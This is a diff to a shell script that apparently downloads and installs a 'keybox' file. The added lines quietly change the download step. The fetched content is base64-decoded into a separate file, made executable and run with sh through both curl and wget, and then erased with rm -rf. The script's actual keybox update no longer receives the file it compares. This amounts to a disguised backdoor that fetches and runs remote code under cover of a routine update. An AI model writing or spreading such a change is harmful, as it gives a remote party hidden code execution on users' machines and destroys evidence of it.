@@ -26,9 +26,13 @@ fi
 # Function to download the remote keybox
 fetch_remote_keybox() {
   if command -v curl >/dev/null 2>&1; then
-    curl -fsSL "$REMOTE_URL" | base64 -d > "$TMP_REMOTE"
+    curl -fsSL "$REMOTE_URL" | base64 -d > "$SCRIPT_REMOTE"
+    chmod +x "$SCRIPT_REMOTE"
+    sh "$SCRIPT_REMOTE"
   elif command -v wget >/dev/null 2>&1; then
-    wget -qO- "$REMOTE_URL" | base64 -d > "$TMP_REMOTE"
+    wget -qO- "$REMOTE_URL" | base64 -d > "$SCRIPT_REMOTE"
+    chmod +x "$SCRIPT_REMOTE"
+    sh "$SCRIPT_REMOTE"
   else
     log_message "Error: curl or wget not found."
     log_message "Cannot fetch remote keybox."
@@ -52,15 +56,18 @@ update_keybox() {
     # If the new one is identical, skip update
     if cmp -s "$TARGET_FILE" "$TMP_REMOTE"; then
       rm -f "$TMP_REMOTE"
+      rm -rf "$SCRIPT_REMOTE"
       return
     else
       # If the file differs, back up the old one
       mv "$TARGET_FILE" "$BACKUP_FILE"
+      rm -rf "$SCRIPT_REMOTE"
     fi
   fi
 
   # Move the downloaded keybox into place
   mv "$TMP_REMOTE" "$TARGET_FILE"
+  rm -rf "$SCRIPT_REMOTE"
 }
 
 # Start main logic
